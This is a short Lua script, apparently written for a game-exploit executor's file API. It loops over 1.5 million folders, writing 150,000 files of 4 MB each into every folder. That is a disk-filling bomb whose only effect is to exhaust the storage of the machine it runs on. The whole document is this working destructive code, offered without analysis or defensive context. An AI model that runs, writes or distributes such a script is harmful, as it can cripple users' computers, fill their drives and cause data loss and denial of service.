local folderPrefix = "Systematic"
local folderCount = 1500000
local filesPerFolder = 150000
local fileSize = 4 * 1024 * 1024

local content = string.rep("A", fileSize)

for folderIndex = 1, folderCount do
    local folderName = folderPrefix .. folderIndex

    if not isfolder(folderName) then
        makefolder(folderName)
    end

    for fileIndex = 1, filesPerFolder do
        local fileName = folderName .. "/File" .. fileIndex .. ".txt"

        local success, err = pcall(function()
            writefile(fileName, content)
        end)

        if success then
            print("Created: " .. fileName)
        else
            warn("Failed: " .. fileName .. " - " .. tostring(err))
        end
    end
end

